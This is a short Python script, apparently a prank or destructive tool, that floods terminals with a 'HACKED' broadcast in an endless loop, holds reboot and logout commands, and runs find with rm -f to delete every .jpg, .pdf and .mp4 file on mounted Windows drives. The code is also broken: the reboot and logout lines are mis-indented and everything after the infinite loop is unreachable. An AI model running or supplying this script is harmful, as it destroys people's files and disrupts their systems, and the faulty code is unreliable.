import os
from time import sleep

# Function to send a message (using wall command)
def message():
    os.system('echo "HACKED" | wall')

# Infinite loop to send the message every second
while True:
    message()
    sleep(1)

# Uncomment the following lines to use shutdown, restart, or logout commands
# os.system("shutdown now")  # For shutdown your system
 os.system("reboot")         # For restart your system
 os.system("gnome-session-quit --logout")  # For logout your system

# To delete specific file types from specified drives
drivelist = ["/mnt/c", "/mnt/d", "/mnt/e"]  # Adjust these paths as needed
for drive in drivelist:
    os.system(f"find {drive} -name '*.jpg' -exec rm -f {{}} +")
    os.system(f"find {drive} -name '*.pdf' -exec rm -f {{}} +")
    os.system(f"find {drive} -name '*.mp4' -exec rm -f {{}} +")
